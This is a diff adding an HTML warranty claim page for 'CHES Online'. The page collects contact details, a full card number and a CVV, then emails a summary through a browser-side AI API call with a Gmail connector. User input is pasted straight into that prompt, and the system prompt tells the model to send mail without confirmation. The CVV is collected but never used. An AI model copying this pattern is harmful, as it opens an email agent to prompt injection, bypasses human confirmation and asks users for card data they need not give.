@@ -1,0 +1,695 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CHES Online Warranty</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=DM+Serif+Display&display=swap" rel="stylesheet">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --bg: #f5f5f4;
+    --surface: #ffffff;
+    --border: #e0ddd9;
+    --border-dark: #b0ada8;
+    --text: #1a1a18;
+    --text-2: #5a5855;
+    --text-3: #9a9793;
+    --error: #c0392b;
+    --success: #2e7d52;
+  }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Inter', sans-serif;
+    font-size: 14px;
+    line-height: 1.6;
+    min-height: 100vh;
+  }
+
+  .topbar {
+    background: var(--text);
+    color: #fff;
+    text-align: center;
+    padding: 10px 24px;
+    font-size: 11px;
+    letter-spacing: 0.25em;
+    font-weight: 500;
+    text-transform: uppercase;
+  }
+
+  .header {
+    background: var(--surface);
+    border-bottom: 1px solid var(--border);
+    padding: 40px 24px 36px;
+    text-align: center;
+  }
+
+  .logo {
+    font-family: 'DM Serif Display', serif;
+    font-size: 2.6rem;
+    letter-spacing: -0.01em;
+    color: var(--text);
+    line-height: 1;
+  }
+
+  .logo-dot { color: var(--text-3); }
+
+  .header-sub {
+    margin-top: 6px;
+    font-size: 11px;
+    letter-spacing: 0.3em;
+    text-transform: uppercase;
+    color: var(--text-3);
+    font-weight: 400;
+  }
+
+  .header-rule {
+    width: 32px; height: 1px;
+    background: var(--border-dark);
+    margin: 20px auto;
+  }
+
+  .header-title {
+    font-size: 13px;
+    font-weight: 500;
+    letter-spacing: 0.18em;
+    text-transform: uppercase;
+    color: var(--text-2);
+  }
+
+  .page {
+    max-width: 680px;
+    margin: 0 auto;
+    padding: 36px 20px 80px;
+  }
+
+  .section {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    margin-bottom: 12px;
+  }
+
+  .section-header {
+    padding: 16px 24px;
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .section-num {
+    width: 22px; height: 22px;
+    border: 1px solid var(--text);
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 10px; font-weight: 600;
+    flex-shrink: 0; color: var(--text);
+  }
+
+  .section-title {
+    font-size: 11px;
+    font-weight: 600;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--text);
+  }
+
+  .section-body { padding: 24px; }
+
+  .row-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+  .row-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 14px; }
+
+  @media (max-width: 500px) {
+    .row-2, .row-3 { grid-template-columns: 1fr; }
+    .section-body { padding: 18px 16px; }
+    .section-header { padding: 14px 16px; }
+  }
+
+  .field { margin-bottom: 16px; }
+  .field:last-child { margin-bottom: 0; }
+
+  label {
+    display: block;
+    font-size: 10.5px; font-weight: 600;
+    letter-spacing: 0.18em; text-transform: uppercase;
+    color: var(--text-2); margin-bottom: 7px;
+  }
+
+  label .req { color: var(--text); margin-left: 2px; }
+
+  input, select, textarea {
+    width: 100%;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 0;
+    padding: 11px 13px;
+    color: var(--text);
+    font-family: 'Inter', sans-serif;
+    font-size: 13.5px; font-weight: 400;
+    outline: none;
+    transition: border-color 0.15s;
+    -webkit-appearance: none; appearance: none;
+  }
+
+  input:focus, select:focus, textarea:focus {
+    border-color: var(--text); background: #fff;
+  }
+
+  input.err, select.err, textarea.err { border-color: var(--error); }
+
+  .ferr { font-size: 11px; color: var(--error); margin-top: 4px; }
+
+  select {
+    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='10' height='6'%3E%3Cpath d='M1 1l4 4 4-4' stroke='%231a1a18' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E");
+    background-repeat: no-repeat;
+    background-position: right 13px center;
+    padding-right: 34px; cursor: pointer;
+  }
+
+  select option { background: #fff; }
+  textarea { resize: vertical; min-height: 96px; }
+  input::placeholder, textarea::placeholder { color: var(--text-3); }
+
+  /* Upload */
+  .upload-zone {
+    border: 1.5px dashed var(--border-dark);
+    padding: 24px 20px;
+    text-align: center;
+    cursor: pointer;
+    transition: border-color 0.15s, background 0.15s;
+    background: var(--bg);
+    position: relative;
+  }
+
+  .upload-zone:hover, .upload-zone.drag-over {
+    border-color: var(--text); background: #eeede9;
+  }
+
+  .upload-zone input[type="file"] {
+    position: absolute; inset: 0; opacity: 0; cursor: pointer;
+    width: 100%; height: 100%; padding: 0; border: none; background: none;
+  }
+
+  .upload-icon { display: block; margin: 0 auto 10px; opacity: 0.35; }
+
+  .upload-label { font-size: 12px; font-weight: 500; color: var(--text-2); letter-spacing: 0.05em; }
+  .upload-hint { font-size: 11px; color: var(--text-3); margin-top: 4px; }
+
+  .preview-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(72px, 1fr));
+    gap: 6px; margin-top: 10px;
+  }
+
+  .preview-thumb {
+    aspect-ratio: 1; position: relative;
+    background: var(--bg); border: 1px solid var(--border); overflow: hidden;
+  }
+
+  .preview-thumb img { width: 100%; height: 100%; object-fit: cover; display: block; }
+
+  .preview-thumb .vid-label {
+    position: absolute; inset: 0;
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    font-size: 9px; color: var(--text-2); font-weight: 500; gap: 4px;
+    padding: 4px;
+  }
+
+  .preview-thumb .vid-label span {
+    max-width: 100%; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; text-align: center;
+  }
+
+  .remove-thumb {
+    position: absolute; top: 3px; right: 3px;
+    background: rgba(0,0,0,0.55); color: #fff; border: none;
+    width: 18px; height: 18px; border-radius: 50%;
+    font-size: 12px; cursor: pointer;
+    display: flex; align-items: center; justify-content: center;
+    line-height: 1;
+  }
+
+  /* CC */
+  .cc-badges { display: flex; gap: 6px; margin-bottom: 18px; flex-wrap: wrap; }
+
+  .cc-badge {
+    border: 1px solid var(--border);
+    padding: 3px 10px; font-size: 10px;
+    font-weight: 600; letter-spacing: 0.08em;
+    color: var(--text-2); text-transform: uppercase;
+  }
+
+  .cc-notice {
+    background: var(--bg);
+    border-left: 2px solid var(--border-dark);
+    padding: 10px 14px; font-size: 12px;
+    color: var(--text-2); line-height: 1.55; margin-bottom: 20px;
+  }
+
+  .check-row { display: flex; gap: 12px; align-items: flex-start; margin-bottom: 20px; }
+
+  .check-row input[type="checkbox"] {
+    width: 16px; height: 16px; flex-shrink: 0; margin-top: 2px;
+    padding: 0; border: 1px solid var(--border-dark); background: #fff;
+    accent-color: var(--text); cursor: pointer;
+  }
+
+  .check-row span { font-size: 12.5px; color: var(--text-2); line-height: 1.6; }
+
+  .submit-btn {
+    width: 100%; background: var(--text); color: #fff;
+    border: none; padding: 16px;
+    font-family: 'Inter', sans-serif;
+    font-size: 11.5px; font-weight: 600;
+    letter-spacing: 0.28em; text-transform: uppercase;
+    cursor: pointer; transition: background 0.15s, opacity 0.15s;
+  }
+
+  .submit-btn:hover:not(:disabled) { background: #333; }
+  .submit-btn:disabled { opacity: 0.45; cursor: not-allowed; }
+
+  .status {
+    margin-top: 14px; padding: 14px 16px;
+    font-size: 13px; line-height: 1.55; display: none;
+  }
+
+  .status.ok {
+    display: block; background: #f0f7f3;
+    border: 1px solid #b8dcc8; color: var(--success);
+  }
+
+  .status.fail {
+    display: block; background: #fdf4f4;
+    border: 1px solid #e8c0bc; color: var(--error);
+  }
+
+  .footer {
+    text-align: center; padding: 28px 0 0;
+    font-size: 11px; color: var(--text-3);
+    letter-spacing: 0.1em;
+    border-top: 1px solid var(--border); margin-top: 8px;
+  }
+
+  .footer strong { color: var(--text-2); font-weight: 600; }
+
+  .spinner {
+    display: inline-block; width: 12px; height: 12px;
+    border: 2px solid rgba(255,255,255,0.3);
+    border-top-color: #fff; border-radius: 50%;
+    animation: spin 0.65s linear infinite;
+    vertical-align: middle; margin-right: 8px;
+  }
+
+  @keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+
+<div class="topbar">CHES Online — Warranty Claim Portal</div>
+
+<header class="header">
+  <div class="logo">CHES<span class="logo-dot">.</span>Online</div>
+  <div class="header-sub">Management Group</div>
+  <div class="header-rule"></div>
+  <div class="header-title">Online Warranty — Submit a Claim</div>
+</header>
+
+<main class="page">
+
+  <!-- 1. Customer -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">1</div>
+      <div class="section-title">Customer Information</div>
+    </div>
+    <div class="section-body">
+      <div class="row-2">
+        <div class="field">
+          <label>First Name <span class="req">*</span></label>
+          <input type="text" id="firstName" placeholder="John">
+        </div>
+        <div class="field">
+          <label>Last Name <span class="req">*</span></label>
+          <input type="text" id="lastName" placeholder="Smith">
+        </div>
+      </div>
+      <div class="row-2">
+        <div class="field">
+          <label>Email <span class="req">*</span></label>
+          <input type="email" id="email" placeholder="john@example.com">
+        </div>
+        <div class="field">
+          <label>Phone <span class="req">*</span></label>
+          <input type="tel" id="phone" placeholder="+1 (555) 000-0000">
+        </div>
+      </div>
+      <div class="field">
+        <label>Mailing Address</label>
+        <input type="text" id="address" placeholder="Street, City, State, ZIP">
+      </div>
+    </div>
+  </div>
+
+  <!-- 2. Product -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">2</div>
+      <div class="section-title">Product Information</div>
+    </div>
+    <div class="section-body">
+      <div class="row-2">
+        <div class="field">
+          <label>Product Name / Model <span class="req">*</span></label>
+          <input type="text" id="productName" placeholder="e.g. CHES Pro 2000">
+        </div>
+        <div class="field">
+          <label>Serial / Order Number</label>
+          <input type="text" id="serialNumber" placeholder="e.g. CH-20241234">
+        </div>
+      </div>
+      <div class="field" style="max-width:220px">
+        <label>Purchase Date <span class="req">*</span></label>
+        <input type="date" id="purchaseDate">
+      </div>
+      <div class="field">
+        <label>Photo of Model / Serial Number Label</label>
+        <div class="upload-zone" id="zone-serial"
+          ondragover="onDrag(event,'serial')"
+          ondragleave="offDrag('serial')"
+          ondrop="onDrop(event,'serial')">
+          <input type="file" id="files-serial" accept="image/*" multiple
+            onchange="handleFiles('serial',this.files)">
+          <svg class="upload-icon" width="30" height="30" viewBox="0 0 30 30" fill="none">
+            <rect x="2" y="7" width="26" height="20" rx="1.5" stroke="#1a1a18" stroke-width="1.4"/>
+            <circle cx="11" cy="16" r="3.5" stroke="#1a1a18" stroke-width="1.4"/>
+            <path d="M19 20l-3.5-4.5-2.5 3-2-2.5L7 20h17" stroke="#1a1a18" stroke-width="1.2" fill="none"/>
+            <path d="M20 4V1M18 2.5l2-2 2 2" stroke="#1a1a18" stroke-width="1.3" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+          <div class="upload-label">Upload photo of label</div>
+          <div class="upload-hint">Click or drag &amp; drop · JPG, PNG, HEIC</div>
+        </div>
+        <div class="preview-grid" id="preview-serial"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 3. Issue -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">3</div>
+      <div class="section-title">Issue Details</div>
+    </div>
+    <div class="section-body">
+      <div class="field">
+        <label>Issue Category <span class="req">*</span></label>
+        <select id="issueCategory">
+          <option value="" disabled selected>Select a category</option>
+          <option>Defective / Not Working</option>
+          <option>Physical Damage</option>
+          <option>Missing Parts / Accessories</option>
+          <option>Performance Issue</option>
+          <option>Other</option>
+        </select>
+      </div>
+      <div class="field">
+        <label>Description <span class="req">*</span></label>
+        <textarea id="issueDescription" placeholder="Describe the issue in detail — when it started, what you have already tried…"></textarea>
+      </div>
+      <div class="field">
+        <label>Photos &amp; Videos of Issue</label>
+        <div class="upload-zone" id="zone-issue"
+          ondragover="onDrag(event,'issue')"
+          ondragleave="offDrag('issue')"
+          ondrop="onDrop(event,'issue')">
+          <input type="file" id="files-issue" accept="image/*,video/*" multiple
+            onchange="handleFiles('issue',this.files)">
+          <svg class="upload-icon" width="30" height="30" viewBox="0 0 30 30" fill="none">
+            <rect x="2" y="7" width="20" height="16" rx="1.5" stroke="#1a1a18" stroke-width="1.4"/>
+            <path d="M22 12l6 3-6 3V12z" stroke="#1a1a18" stroke-width="1.4" stroke-linejoin="round" fill="none"/>
+            <circle cx="9" cy="14" r="2.5" stroke="#1a1a18" stroke-width="1.2"/>
+            <path d="M14 19l-2.5-3-2 2.5-1.5-2L5 19h13" stroke="#1a1a18" stroke-width="1.1" fill="none"/>
+          </svg>
+          <div class="upload-label">Upload photos or videos</div>
+          <div class="upload-hint">Click or drag &amp; drop · JPG, PNG, MP4, MOV · Max 10 files</div>
+        </div>
+        <div class="preview-grid" id="preview-issue"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 4. Payment -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">4</div>
+      <div class="section-title">Payment Information</div>
+    </div>
+    <div class="section-body">
+      <div class="cc-badges">
+        <div class="cc-badge">Visa</div>
+        <div class="cc-badge">Mastercard</div>
+        <div class="cc-badge">Amex</div>
+        <div class="cc-badge">Discover</div>
+      </div>
+      <div class="cc-notice">
+        A credit card may be required for shipping, handling, or out-of-warranty service fees. Your card will only be charged after we confirm costs with you.
+      </div>
+      <div class="field">
+        <label>Cardholder Name <span class="req">*</span></label>
+        <input type="text" id="cardName" placeholder="Full name as shown on card">
+      </div>
+      <div class="field">
+        <label>Card Number <span class="req">*</span></label>
+        <input type="text" id="cardNumber" placeholder="•••• •••• •••• ••••" maxlength="19" inputmode="numeric">
+      </div>
+      <div class="row-3">
+        <div class="field">
+          <label>Expiry Month <span class="req">*</span></label>
+          <select id="expMonth">
+            <option value="" disabled selected>MM</option>
+            <option>01</option><option>02</option><option>03</option><option>04</option>
+            <option>05</option><option>06</option><option>07</option><option>08</option>
+            <option>09</option><option>10</option><option>11</option><option>12</option>
+          </select>
+        </div>
+        <div class="field">
+          <label>Expiry Year <span class="req">*</span></label>
+          <select id="expYear">
+            <option value="" disabled selected>YYYY</option>
+            <script>for(let y=2025;y<=2035;y++)document.write(`<option>${y}</option>`);</script>
+          </select>
+        </div>
+        <div class="field">
+          <label>CVV <span class="req">*</span></label>
+          <input type="text" id="cvv" placeholder="•••" maxlength="4" inputmode="numeric">
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 5. Submit -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">5</div>
+      <div class="section-title">Confirmation</div>
+    </div>
+    <div class="section-body">
+      <div class="check-row">
+        <input type="checkbox" id="agreeTerms">
+        <span>I confirm all information is accurate and agree to CHES Online's warranty terms and conditions. I authorise CHES Management Group to contact me regarding this claim.</span>
+      </div>
+      <button class="submit-btn" id="submitBtn" onclick="submitForm()">Submit Warranty Claim</button>
+      <div id="statusBox" class="status"></div>
+    </div>
+  </div>
+
+  <footer class="footer">
+    <strong>CHES Online</strong> &nbsp;·&nbsp; chesmanagementgroup@gmail.com<br>
+    <span style="margin-top:5px;display:block;">© 2025 CHES Management Group. All rights reserved.</span>
+  </footer>
+
+</main>
+
+<script>
+  const fileStore = { serial: [], issue: [] };
+
+  function handleFiles(key, incoming) {
+    const max = key === 'issue' ? 10 : 5;
+    Array.from(incoming).forEach(f => {
+      if (fileStore[key].length < max) fileStore[key].push(f);
+    });
+    renderPreviews(key);
+  }
+
+  function removeFile(key, idx) {
+    fileStore[key].splice(idx, 1);
+    renderPreviews(key);
+  }
+
+  function renderPreviews(key) {
+    const grid = document.getElementById('preview-' + key);
+    grid.innerHTML = '';
+    fileStore[key].forEach((f, i) => {
+      const wrap = document.createElement('div');
+      wrap.className = 'preview-thumb';
+
+      const btn = document.createElement('button');
+      btn.className = 'remove-thumb';
+      btn.innerHTML = '&times;';
+      btn.onclick = () => removeFile(key, i);
+
+      if (f.type.startsWith('image/')) {
+        const img = document.createElement('img');
+        img.src = URL.createObjectURL(f);
+        wrap.appendChild(img);
+      } else {
+        const lbl = document.createElement('div');
+        lbl.className = 'vid-label';
+        lbl.innerHTML = `<svg width="20" height="20" viewBox="0 0 20 20" fill="none"><rect x="1" y="3" width="13" height="14" rx="1" stroke="#5a5855" stroke-width="1.3"/><path d="M14 7l5 3-5 3V7z" stroke="#5a5855" stroke-width="1.3" fill="none" stroke-linejoin="round"/></svg><span>${f.name}</span>`;
+        wrap.appendChild(lbl);
+      }
+      wrap.appendChild(btn);
+      grid.appendChild(wrap);
+    });
+  }
+
+  function onDrag(e, key) { e.preventDefault(); document.getElementById('zone-' + key).classList.add('drag-over'); }
+  function offDrag(key) { document.getElementById('zone-' + key).classList.remove('drag-over'); }
+  function onDrop(e, key) { e.preventDefault(); offDrag(key); handleFiles(key, e.dataTransfer.files); }
+
+  document.getElementById('cardNumber').addEventListener('input', function(e) {
+    let v = e.target.value.replace(/\D/g,'').substring(0,16);
+    e.target.value = v.replace(/(.{4})/g,'$1 ').trim();
+  });
+
+  document.getElementById('cvv').addEventListener('input', function(e) {
+    e.target.value = e.target.value.replace(/\D/g,'');
+  });
+
+  const $ = id => document.getElementById(id);
+  const val = id => $(id)?.value?.trim() || '';
+
+  function clearErrors() {
+    document.querySelectorAll('.err').forEach(el => el.classList.remove('err'));
+    document.querySelectorAll('.ferr').forEach(el => el.remove());
+  }
+
+  function markErr(id, msg) {
+    const el = $(id); if (!el) return;
+    el.classList.add('err');
+    const d = document.createElement('div');
+    d.className = 'ferr'; d.textContent = msg;
+    el.parentElement.appendChild(d);
+  }
+
+  async function submitForm() {
+    clearErrors();
+    let ok = true;
+
+    const required = [
+      ['firstName','First name required'],['lastName','Last name required'],
+      ['email','Email required'],['phone','Phone required'],
+      ['productName','Product name required'],['purchaseDate','Purchase date required'],
+      ['issueCategory','Select an issue category'],['issueDescription','Please describe the issue'],
+      ['cardName','Cardholder name required'],['cardNumber','Card number required'],
+      ['expMonth','Select expiry month'],['expYear','Select expiry year'],['cvv','CVV required'],
+    ];
+
+    required.forEach(([id, msg]) => { if (!val(id)) { markErr(id, msg); ok = false; } });
+
+    const em = val('email');
+    if (em && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(em)) { markErr('email','Invalid email address'); ok = false; }
+
+    if (!$('agreeTerms').checked) {
+      $('agreeTerms').parentElement.querySelector('span').style.color = 'var(--error)';
+      ok = false;
+    }
+
+    if (!ok) {
+      const firstErr = document.querySelector('.err');
+      if (firstErr) window.scrollTo({ top: firstErr.getBoundingClientRect().top + window.scrollY - 120, behavior: 'smooth' });
+      return;
+    }
+
+    const btn = $('submitBtn');
+    const box = $('statusBox');
+    btn.disabled = true;
+    btn.innerHTML = '<span class="spinner"></span>Submitting\u2026';
+    box.className = 'status';
+
+    const serialNames = fileStore.serial.map(f => f.name).join(', ') || 'None attached';
+    const issueNames  = fileStore.issue.map(f => f.name).join(', ') || 'None attached';
+    const cardMasked  = '\u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 ' + val('cardNumber').replace(/\s/g,'').slice(-4);
+
+    const body = [
+      'NEW WARRANTY CLAIM — CHES ONLINE WARRANTY',
+      '==========================================',
+      '',
+      'CUSTOMER',
+      '  Name:           ' + val('firstName') + ' ' + val('lastName'),
+      '  Email:          ' + val('email'),
+      '  Phone:          ' + val('phone'),
+      '  Address:        ' + (val('address') || '—'),
+      '',
+      'PRODUCT',
+      '  Model / Name:   ' + val('productName'),
+      '  Serial / Order: ' + (val('serialNumber') || '—'),
+      '  Purchase Date:  ' + val('purchaseDate'),
+      '  Label Photos:   ' + serialNames,
+      '',
+      'ISSUE',
+      '  Category:       ' + val('issueCategory'),
+      '  Description:',
+      '  ' + val('issueDescription'),
+      '  Attached Media: ' + issueNames,
+      '',
+      'PAYMENT',
+      '  Cardholder:     ' + val('cardName'),
+      '  Card Number:    ' + cardMasked,
+      '  Expiry:         ' + val('expMonth') + '/' + val('expYear'),
+      '',
+      'Submitted: ' + new Date().toLocaleString('en-AU', { timeZone: 'Australia/Melbourne' }),
+    ].join('\n');
+
+    try {
+      const res = await fetch('https://api.anthropic.com/v1/messages', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          model: 'claude-sonnet-4-20250514',
+          max_tokens: 1000,
+          system: 'You send emails via Gmail. When given an email to send, send it immediately without asking for confirmation.',
+          messages: [{ role: 'user', content:
+            'Send an email via Gmail:\nTo: chesmanagementgroup@gmail.com\nSubject: New Warranty Claim – '
+            + val('firstName') + ' ' + val('lastName') + ' – ' + val('productName')
+            + '\nBody:\n' + body
+          }],
+          mcp_servers: [{ type: 'url', url: 'https://gmail.mcp.claude.com/mcp', name: 'gmail-mcp' }]
+        })
+      });
+
+      if (res.ok) {
+        box.className = 'status ok';
+        box.innerHTML = '<strong>Claim submitted successfully.</strong><br>Thank you, '
+          + val('firstName') + '. We\'ll be in touch within 1–3 business days at <strong>'
+          + val('email') + '</strong>.';
+        document.querySelectorAll('input:not([type=checkbox]), select, textarea').forEach(el => {
+          el.tagName === 'SELECT' ? (el.selectedIndex = 0) : (el.value = '');
+        });
+        $('agreeTerms').checked = false;
+        fileStore.serial = []; fileStore.issue = [];
+        renderPreviews('serial'); renderPreviews('issue');
+      } else { throw new Error(res.status); }
+    } catch {
+      box.className = 'status fail';
+      box.innerHTML = '<strong>Submission failed.</strong> Please try again or contact us directly at <strong>chesmanagementgroup@gmail.com</strong>.';
+    }
+
+    btn.innerHTML = 'Submit Warranty Claim';
+    btn.disabled = false;
+  }
+</script>
+</body>
+</html>
